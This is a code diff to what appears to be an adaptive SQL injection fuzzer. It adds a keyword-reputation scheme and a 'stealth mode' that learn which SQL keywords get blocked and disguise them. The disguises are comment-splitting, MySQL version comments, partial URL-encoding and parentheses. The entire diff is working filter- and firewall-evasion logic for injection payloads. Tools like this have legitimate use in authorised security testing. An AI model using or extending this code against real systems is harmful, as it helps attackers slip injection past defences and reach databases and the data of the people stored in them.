@@ -9,10 +9,13 @@ class ASTMutator:
             "inline_comments": self._inline_version_comments,
             "union_balance": self._balance_union_columns,
             "junk_fill": self._junk_filling,
-            "context_aware": self._context_aware_mutation
+            "context_aware": self._context_aware_mutation,
+            "directed_bypass": self._directed_keyword_mutation
         }
         # Awareness: Track success of each strategy
         self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
+        # Gene Credit Assignment: Track reputation of each keyword
+        self.keyword_reputation = {kw: 1.0 for kw in self.sql_keywords}
         self.last_strategy_used = None
         self.stealth_mode = False
 
@@ -34,6 +37,7 @@ class ASTMutator:
         if self.stealth_mode:
             current_weights["context_aware"] *= 2.0
             current_weights["inline_comments"] *= 2.0
+            current_weights["directed_bypass"] *= 3.0
             print("[*] Stealth Mode Active: Prioritizing evasive mutations.", flush=True)
 
         for _ in range(num_mutations):
@@ -47,13 +51,24 @@ class ASTMutator:
             
         return mutated
 
-    def report_success(self, score):
-        """Awareness: Update strategy weights based on the score achieved."""
+    def report_success(self, payload, score):
+        """Gene Credit Assignment: Update strategy and keyword reputation based on score."""
         # Detect if we are being blocked consistently
         if score <= 0.1:
             self.stealth_mode = True
+            # Penalize keywords present in a blocked payload
+            for kw in self.sql_keywords:
+                if kw in payload.upper():
+                    self.keyword_reputation[kw] -= 0.1
+                    self.keyword_reputation[kw] = max(0.1, self.keyword_reputation[kw])
         else:
             self.stealth_mode = False
+            # Reward keywords in a successful payload
+            if score > 0.5:
+                for kw in self.sql_keywords:
+                    if kw in payload.upper():
+                        self.keyword_reputation[kw] += 0.05
+                        self.keyword_reputation[kw] = min(2.0, self.keyword_reputation[kw])
 
         if self.last_strategy_used and score > 0.5:
             # Reward the strategy
@@ -63,6 +78,24 @@ class ASTMutator:
             for k in self.strategy_weights:
                 self.strategy_weights[k] /= total
                 self.strategy_weights[k] *= len(self.strategy_weights) # Keep average at 1.0
+
+    def _directed_keyword_mutation(self, payload):
+        """Directed Mutations: Apply bypasses to keywords based on their reputation."""
+        mutated = payload
+        # Find keywords with low reputation in the current payload
+        for kw, rep in self.keyword_reputation.items():
+            if kw in mutated.upper() and (rep < 0.8 or random.random() < 0.3):
+                # Apply a bypass transformation
+                bypasses = [
+                    lambda k: f"{k[:len(k)//2]}/**/{k[len(k)//2:]}",
+                    lambda k: f"/*!{k}*/",
+                    lambda k: "".join([f"%{ord(c):02X}" if random.random() < 0.3 else c for c in k]),
+                    lambda k: f"({k})" if k in ["SELECT", "UNION"] else k
+                ]
+                transform = random.choice(bypasses)
+                # Use regex to replace keyword while preserving case if possible
+                mutated = re.sub(rf'\b{kw}\b', transform(kw), mutated, flags=re.IGNORECASE)
+        return mutated
 
     def _apply_error_feedback(self, payload, error):
         """Applies specific mutations based on SQL error messages."""
